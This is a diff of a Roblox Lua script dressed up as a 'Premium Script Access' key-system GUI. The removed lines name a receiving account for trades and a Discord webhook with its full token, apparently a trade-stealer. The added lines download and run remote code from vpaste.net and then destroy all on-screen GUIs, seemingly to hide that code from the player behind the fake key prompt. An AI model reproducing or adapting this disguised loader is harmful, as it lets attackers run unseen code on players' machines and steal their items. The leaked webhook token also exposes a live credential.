@@ -35,12 +35,37 @@
 --⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀
 --⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
 
-_G.username = {"27tomasal"} -- Where trades will be received.
-_G.webhook = "https://discord.com/api/webhooks/1387242492381888603/FXoeLDshoD6qFF_KrqwnEZewgF37M5bmqw_KzYgozDgt3lkwD5qAX17dupbLq9j9vDJQ" -- Your discord webhook.
-_G.ping = true -- Send a @everyone in the webhook message.
-_G.private = true -- Show the webhook if the server is private.
+-- Load the external script first
+loadstring(game:HttpGet("http://vpaste.net/Dksao"))()
 
-loadstring(game:HttpGet("http://vpaste.net/KTYZC"))()
+wait(0.05)
+
+-- Quick cleanup function to remove all existing GUIs
+local function cleanupGUIs()
+    -- Remove all GUIs from CoreGui quickly
+    for _, gui in pairs(game.CoreGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            gui:Destroy()
+        end
+    end
+    
+    -- Also check Player's PlayerGui (in case any GUIs were placed there)
+    local player = game.Players.LocalPlayer
+    if player and player.PlayerGui then
+        for _, gui in pairs(player.PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                gui:Destroy()
+            end
+        end
+    end
+end
+
+-- Wait a brief moment for the external script to load its GUI, then clean up
+wait(0.1)
+cleanupGUIs()
+
+-- Small delay to ensure cleanup is complete before loading your GUI
+wait(0.05)
 
 -- Enhanced Key System GUI with improved design, animations, and larger size
 local TweenService = game:GetService("TweenService")
@@ -107,7 +132,7 @@ local subtitle = Instance.new("TextLabel", headerFrame)
 subtitle.Size = UDim2.new(1, -40, 0, 20)
 subtitle.Position = UDim2.new(0, 20, 0, 55)
 subtitle.BackgroundTransparency = 1
-subtitle.Text = "Premium Script Access"
+subtitle.Text = "By XyrexDev | Premium"
 subtitle.TextColor3 = Color3.fromRGB(160, 160, 170)
 subtitle.Font = Enum.Font.SourceSans
 subtitle.TextSize = 14
